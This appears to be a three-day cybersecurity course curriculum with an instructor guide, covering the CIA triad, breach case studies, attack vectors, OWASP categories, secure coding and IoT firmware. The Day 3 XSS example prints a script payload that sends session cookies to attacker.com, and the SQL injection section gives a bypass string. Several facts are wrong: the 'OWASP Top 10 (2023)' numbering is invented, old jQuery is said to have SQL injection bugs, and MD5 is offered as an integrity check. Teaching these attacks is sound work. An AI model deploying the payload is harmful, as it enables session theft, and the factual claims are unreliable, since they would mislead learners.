Day 1 – The Cybersecurity Mindset

9:00 – 9:30: Cybersecurity Fundamentals & the CIA Triad

Understanding the three pillars of information security through real-world business scenarios.

Core Concept: What is Cybersecurity?

Cybersecurity is the practice of protecting digital systems, networks, and data from unauthorized access, theft, and damage. In the business context, it's fundamentally about risk mitigation—identifying vulnerabilities before attackers exploit them.

The CIA Triad Explained

1. Confidentiality

Ensures only authorized users access sensitive data. Real-world example: A fintech app encrypts customer bank account numbers so they're unreadable if intercepted. Failure: A database breach exposes 5M customer records.

2. Integrity

Guarantees data hasn't been altered or tampered with during storage or transmission. Real-world example: A healthcare system uses digital signatures to verify medical records haven't been modified. Failure: An attacker changes a patient's medication dosage in the system.

3. Availability

Ensures authorized users can access systems when needed. Real-world example: An e-commerce platform maintains redundant servers to stay online during Black Friday sales. Failure: A DDoS attack knocks the site offline, costing $100K/hour in lost revenue.

9:30 – 10:30: Global Case Studies & Industry Context

Case Study 1: E-Commerce Payment Fraud (Magecart Attack)

Region: Brazil, primarily. Impact: Attackers injected malicious code into e-commerce platforms, stealing credit card data.

CIA Breakdown:

  • Confidentiality: Credit cards exposed.
  • Integrity: Checkout code was secretly modified.
  • Availability: Sites continued operating (attackers wanted to remain undetected).

Lesson: Not all attacks aim to crash systems—many steal data silently.

Case Study 2: Cloud Misconfiguration (AWS S3 Bucket)

Region: Global (India, U.S., EU). Impact: Companies accidentally left databases publicly readable, exposing millions of records.

CIA Breakdown:

  • Confidentiality: Failed (anyone on the internet could read data).
  • Integrity: Intact (data wasn't modified).
  • Availability: Intact (databases still worked).

Lesson: Misconfigurations are often the root cause—not sophisticated hacking.

Case Study 3: UPI Payment Fraud (India)

Attack: Phishing links redirected users to fake banking apps, stealing credentials.

CIA Breakdown:

  • Confidentiality: Compromised (credentials stolen).
  • Integrity: Payment records falsified.
  • Availability: Users locked out of real accounts.

Lesson: Human psychology + technology = powerful attack vector.

Day 2 – Threat Landscape & Attack Vectors

9:00 – 12:00

9:00 – 9:30: Modern Attack Vectors Overview

Why This Matters:

Cyberattacks on global businesses rose 300%+ in 2023. Understanding attack vectors helps you anticipate, detect, and respond to threats.

The Top 5 Attack Vectors

1. Malware

Definition: Malicious software designed to damage, disrupt, or gain unauthorized access to systems.

Types: Viruses (self-replicating), Worms (spreads via networks), Trojans (disguised as legitimate), Ransomware (encrypts data for ransom).

Real-world: Ransomware attack on European logistics company (Maersk, 2017) cost $300M and disrupted global shipping.

2. Phishing

Definition: Social engineering attack via fake emails, SMS, or messages to trick users into revealing credentials or clicking malicious links.

Statistics: 90% of breaches originate with phishing (IBM X-Force).

New Trend: Deepfake audio/video scams targeting C-level executives for wire fraud.

3. DDoS (Distributed Denial of Service)

Definition: Overwhelming a target with traffic from multiple sources to make it unavailable.

Impact: E-commerce sites lose revenue; healthcare systems can't serve patients; critical infrastructure disrupted.

Cost: A single DDoS attack on a major retailer costs ~$10K/hour in lost revenue.

4. API Attacks

Definition: Exploiting poorly secured application interfaces (APIs) used by web apps and mobile platforms.

Example: Twitter API exposed millions of user IDs; attackers could dox users.

5. Insider Threats

Definition: Employees or contractors with system access intentionally or unintentionally leak data.

Example: Tesla employee leaked proprietary manufacturing data to competitors.

Day 3 – Secure Coding for Global Startups

9:00 – 12:00

9:00 – 9:30: Intro to OWASP Top 10

What is OWASP?

Open Worldwide Application Security Project—a community that identifies and catalogs the most critical web application vulnerabilities.

The Top 10 Vulnerabilities (2023)

A01: Broken Access Control

Problem: Users can access data/features they shouldn't (e.g., viewing another user's account).

Example: A fintech app lets logged-in users change the account ID in the URL to view anyone's balance.

A02: Cryptographic Failures

Problem: Data in transit or at rest is exposed (unencrypted passwords, credit cards).

Example: A healthtech startup stores passwords in plaintext—a breach exposes all user passwords.

A03: Injection (SQL, Command, LDAP)

Problem: Unsanitized user input is executed as code.

Example: A login form accepts "admin' OR '1'='1" which bypasses authentication.

Fix: Use parameterized queries or prepared statements.

A04: Insecure Design

Problem: Security not considered during architecture (no threat modeling, no rate limiting).

Example: A web app allows unlimited login attempts—attackers brute-force passwords.

A07: Cross-Site Scripting (XSS)

Problem: Attacker injects malicious JavaScript that runs in users' browsers.

Example: A comment form doesn't sanitize input. An attacker posts: <script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>—stealing session tokens.

Fix: Escape/sanitize all user input; use Content Security Policy (CSP) headers.

A09: Using Components with Known Vulnerabilities

Problem: Developers use outdated libraries with publicly known flaws.

Example: A startup uses an old version of jQuery with SQL injection bugs—instantly hackable.

Fix: Keep dependencies updated; use tools like OWASP Dependency-Check.

9:30 – 10:30: Secure Coding Principles & AI-Assisted Security

Core Principle: Input Validation & Output Encoding

Never trust user input. Always validate on the server side and encode output.

Bad Code (Vulnerable):

// Python - SQL Injection vulnerable
username = request.form['username']
query = "SELECT * FROM users WHERE name='" + username + "'"
result = db.execute(query)

Good Code (Secure):

// Python - Parameterized query (safe)
username = request.form['username']
query = "SELECT * FROM users WHERE name=?"
result = db.execute(query, (username,))

Why? If username = "admin' OR '1'='1", the bad code runs malicious SQL. The good code treats it as literal text.

AI-Assisted Tools:

  • GitHub Copilot: Suggests secure code patterns (parameterized queries, hashing functions).
  • SonarQube: Scans code for CWE (Common Weakness Enumeration) violations.
  • Snyk: Identifies vulnerable dependencies in real-time.
Secure Coding Checklist for Startups
  1. ✓ Encrypt sensitive data (passwords, API keys, credit cards) using AES-256.
  2. ✓ Use parameterized queries to prevent SQL injection.
  3. ✓ Validate and sanitize all user input on the server side.
  4. ✓ Implement rate limiting (e.g., max 5 login attempts/minute).
  5. ✓ Use multi-factor authentication (MFA) for admin accounts.
  6. ✓ Keep dependencies updated (run dependency scanners weekly).
  7. ✓ Log security events (failed logins, privilege escalations).
  8. ✓ Test code with SAST tools (Static Application Security Testing) before deployment.

11:30 – 12:00: IoT Firmware Security & Reflection

IoT Security Challenge

Scenario: A smart-lock firmware has a hardcoded root password. How would you exploit it? How would you prevent it?

Root Cause: Developers prioritized convenience over security during development.

Prevention:

  • Generate unique credentials per device during manufacturing.
  • Implement secure firmware signing (prevent unauthorized updates).
  • Enable Secure Boot to verify firmware integrity on startup.
  • Disable debug interfaces in production builds.

Key Insight: IoT devices often run for 5-10 years. A security flaw at launch can impact millions of devices and create massive liability.

Discussion: "Who Owns Liability if AI Suggests Vulnerable Code?"

As AI tools like GitHub Copilot become mainstream, questions arise:

  • If an AI suggests insecure code and a developer uses it without review—who's liable?
  • Should developers be required to audit AI-generated code before deployment?
  • Does using AI-assisted security tools reduce liability?

Answer: Developers remain responsible. AI is a tool, not a replacement for human judgment. Always review, test, and audit code—AI or not.

Instructor Toolkit & Concept Explanations

Complete Teaching Guide

Comprehensive Concept Explanations for Instructors

Module 1: CIA Triad – Deep Conceptual Breakdown

Why start with CIA?

  • It's the foundation of ALL security frameworks (NIST, ISO 27001, GDPR).
  • Every attack can be mapped to one of the three pillars.
  • Business leaders understand risk in terms of C, I, A impact.

Confidentiality (C) – Keep secrets secret

  • What: Only authorized users can read data.
  • How to protect: Encryption (AES-256), access controls (role-based), data minimization.
  • Failure impact: Data breach = PR nightmare + fines + lost customer trust.
  • Real example: Facebook Cambridge Analytica scandal (2018)—personal data shared without consent.

Integrity (I) – Keep data accurate

  • What: Data hasn't been altered, corrupted, or tampered with.
  • How to protect: Digital signatures, checksums (MD5, SHA-256), write-once storage, audit logs.
  • Failure impact: Incorrect data = wrong decisions = financial loss or safety risk.
  • Real example: Attackers modify medical records to falsify prescriptions—patient receives wrong medication.

Availability (A) – Keep systems running

  • What: Authorized users can access systems/data when needed.
  • How to protect: Redundancy (backup servers), DDoS mitigation, disaster recovery, load balancing.
  • Failure impact: Downtime = revenue loss (e.g., $100K/hour for e-commerce), reputation damage.
  • Real example: AWS outage (2021) took down dozens of services for 7 hours—estimated $100M+ in losses.

Teaching Tip: Show students the CIA trade-offs. Sometimes you sacrifice one for another. For example:

  • Banking: Prioritizes Confidentiality & Integrity (account data is sacred).
  • Utilities: Prioritizes Availability & Integrity (power must stay on; data accuracy critical).
  • Social media: Prioritizes Availability (uptime over everything; privacy less critical).
Module 2: Attack Vectors – Tactical Breakdown

Malware Lifecycle (why it matters):

  1. Creation: Attacker writes malicious code (from scratch or modifies existing).
  2. Delivery: Email attachment, compromised website, USB stick, supply chain.
  3. Execution: User opens file → malware runs (sometimes requires UAC bypass).
  4. Persistence: Malware hides in Windows Registry, Startup folder, or Task Scheduler to survive reboots.
  5. Exfiltration: Steals data and sends to attacker's server (command & control).

Student Exercise: Map a ransomware attack to this lifecycle. Explain detection opportunities at each stage.

Phishing Psychology (why it works):

  • Urgency: "Your account will be deleted in 24 hours!"
  • Authority: "CEO requesting wire transfer".
  • Legitimacy: Spoofed email addresses, fake logos.
  • Reciprocity: "Free gift card" or "Exclusive offer".

New Trend (2024+): AI-generated phishing is harder to detect because grammar/spelling is perfect and content is personalized.

DDoS Mechanics:

  • Volumetric: Flood target with traffic (UDP floods, DNS amplification). → Defense: WAF (Web Application Firewall), ISP filtering.
  • Protocol: Exploit protocol weaknesses (SYN floods). → Defense: SYN cookies, rate limiting.
  • Application: Layer 7 attacks targeting specific services (e.g., API endpoints). → Defense: Rate limiting, CAPTCHA, bot detection.
Module 3: Secure Coding – Why It Matters

The Cost of Insecure Code:

  • Fixing bugs AFTER deployment: 10x more expensive than during development.
  • Average data breach cost: $4.5M (IBM, 2023).
  • GDPR fines: Up to €20M or 4% of revenue (whichever is higher).

SQL Injection Deep Dive:

Why parameterized queries work: The query structure and data are separated. The database knows which parts are code and which are data, making injection impossible.

Vulnerable: SELECT * FROM users WHERE id=' + user_input + '
If user_input = "1' OR '1'='1", full query becomes: SELECT * FROM users WHERE id='1' OR '1'='1'
This returns ALL users (auth bypass).

Safe: SELECT * FROM users WHERE id=?
The "?" is a placeholder. The database treats user_input as literal data, not executable code.

IoT Security Realities:

  • IoT devices are usually resource-constrained (limited CPU, memory, power).
  • Can't easily patch—unlike phones/computers that auto-update.
  • Lifespan: 5-15 years → security bugs from 2010 still affect devices in 2024.
  • Consequence: A single flaw can compromise millions of devices globally.
